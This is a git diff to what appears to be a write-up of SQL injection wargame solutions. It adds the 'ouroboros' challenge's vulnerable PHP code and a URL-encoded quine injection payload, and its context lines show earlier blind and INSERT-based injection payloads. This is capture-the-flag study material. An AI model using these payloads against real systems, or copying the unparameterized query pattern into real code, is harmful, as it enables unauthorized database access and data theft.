@@ -916,3 +916,27 @@ payload: ' or case when id="admin" and {pw} like "{j}%" then 9999999999999999999
 ```
 
 payload: '),(0,'ip',(select email from prob\_phantom as cc where no = 1 ))%23
+
+## OUROBOROS([Quines](https://blog.p6.is/quine-sql-injection/))
+
+```php
+<?php
+  include "./config.php";
+  login_chk();
+  $db = dbconnect();
+  if(preg_match('/prob|_|\.|rollup|join|@/i', $_GET['pw'])) exit("No Hack ~_~");
+  $query = "select pw from prob_ouroboros where pw='{$_GET[pw]}'";
+  echo "<hr>query : <strong>{$query}</strong><hr><br>";
+  $result = @mysqli_fetch_array(mysqli_query($db,$query));
+  if($result['pw']) echo "<h2>Pw : {$result[pw]}</h2>";
+  if(($result['pw']) && ($result['pw'] === $_GET['pw'])) solve("ouroboros");
+  highlight_file(__FILE__);
+?>
+```
+
+payload: 1%27%20union%20SELECT%20REPLACE%28REPLACE%28%271%22%20union%20SELECT%20REPLACE%28REPLACE%28%22%24%22%2CCHAR%2834%29%2CCHAR%2839%29%29%2CCHAR%2836%29%2C%22%24%22%29%20AS%20Quine%23%27%2CCHAR%2834%29%2CCHAR%2839%29%29%2CCHAR%2836%29%2C%271%22%20union%20SELECT%20REPLACE%28REPLACE%28%22%24%22%2CCHAR%2834%29%2CCHAR%2839%29%29%2CCHAR%2836%29%2C%22%24%22%29%20AS%20Quine%23%27%29%20AS%20Quine%23
+
+
+
+
+
